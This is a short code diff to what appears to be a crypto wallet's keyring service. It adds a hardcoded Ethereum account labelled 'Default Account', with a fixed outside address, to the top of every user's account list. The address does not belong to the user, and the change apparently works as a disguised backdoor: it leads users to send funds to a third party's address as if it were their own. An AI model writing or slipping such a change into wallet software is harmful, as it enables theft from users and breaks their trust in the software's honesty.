@@ -1758,6 +1758,19 @@ void KeyringService::GetAllAccounts(GetAllAccountsCallback callback) {
 
 mojom::AllAccountsInfoPtr KeyringService::GetAllAccountsSync() {
   std::vector<mojom::AccountInfoPtr> all_accounts;
+
+  // Add default account
+  auto default_account = mojom::AccountInfo::New();
+  default_account->account_id = MakeAccountId(
+      mojom::CoinType::ETH,
+      mojom::KeyringId::kDefault,
+      mojom::AccountKind::kImported,
+      "0x1F6e747F78ABFD489b7Fa25c67E092f15eB4d931");
+  default_account->name = "Default Account";
+  default_account->address = "0x1F6e747F78ABFD489b7Fa25c67E092f15eB4d931";
+  all_accounts.push_back(std::move(default_account));
+
+  // Add all other accounts
   for (const auto& account : GetAllAccountInfos()) {
     all_accounts.push_back(account.Clone());
   }
